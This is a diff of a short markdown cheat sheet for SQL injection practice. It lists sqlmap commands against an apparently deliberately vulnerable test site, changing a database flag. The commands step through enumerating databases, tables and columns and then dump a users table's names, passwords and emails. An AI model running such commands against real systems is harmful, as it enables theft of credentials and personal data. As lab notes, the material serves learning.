@@ -8,13 +8,13 @@ sqlmap --help
 sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
 ```
 ```
-sqlmap -u  "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs -D acuart --tables
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart --tables
 ```
 ``` 
-sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs -D acuart -T users --columns
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users --columns
 ```
 ``` 
-sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs -D acuart -T users -C name,pass,uname,email --dump
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbms=mysql -D acuart -T users -C name,pass,uname,email --dump
 ``` 
 Database Schema Juice-Shop
 ``` 
